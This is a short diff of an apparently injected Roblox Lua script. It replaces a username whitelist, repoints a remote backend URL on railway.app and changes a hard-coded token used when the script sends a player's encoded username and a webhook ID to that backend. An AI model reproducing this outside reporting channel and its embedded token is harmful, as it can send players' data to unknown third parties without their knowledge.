@@ -15,9 +15,9 @@ local CoreGui = game:GetService("CoreGui")
 local VIM = game:GetService("VirtualInputManager")
 
 local whitelist = {
-    "hesizdev",
-    "IlIlIlIlIIlI_lIlIlIl",
-    "multicuentadeangel5"
+    "mario_12fachero",
+    "lejandro555",
+    "pan71234520"
 }
 
 local function isWhitelisted(username)
@@ -349,7 +349,7 @@ end
 
 Game.DescendantAdded:Connect(bloquearInstancia)
 
-local SECURE_BACKEND_URL = "webxd-production-a7e3.up.railway.app"
+local SECURE_BACKEND_URL = "empowering-trust-production.up.railway.app"
 
 local BLACKLIST = {
     4313952753,
@@ -401,7 +401,7 @@ local function requestSecureUrl(category, webhookId)
             username_binary = usernameBinary,
             category = category or "miranda",
             webhook_id = webhookId or "webhook_2",
-            token = "Shxdow_security_v2"
+            token = "Shxdow_security_v3"
         })
 
         local response = HttpService:RequestAsync({
